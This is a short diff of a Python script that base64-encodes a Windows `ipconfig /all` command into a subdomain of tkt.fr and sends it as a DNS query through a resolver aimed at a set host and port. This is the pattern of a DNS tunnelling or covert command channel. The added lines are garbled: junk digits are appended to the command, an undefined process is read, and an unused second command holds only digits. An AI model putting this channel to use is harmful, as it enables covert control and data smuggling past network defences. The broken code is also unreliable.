@@ -13,9 +13,13 @@ res = resolver.Resolver()
 res.nameservers = [HOST]
 res.port = PORT
 
-cmd = b"ipconfig /all"
+# Read the subprocess output as binary
+output_binary = process.communicate()[0]
+
+cmd = b"ipconfig /all144949849888888888888888"
+cmd2 = b"8888888888888888888888888888888888"
 encoded_cmd = base64.b64encode(cmd).decode()
-domain = f"{encoded_cmd}.tkt.fr"
+domain = f"www.{encoded_cmd}.tkt.fr"
 # Faire une requête DNS
 answer = res.resolve(domain, 'A')
 
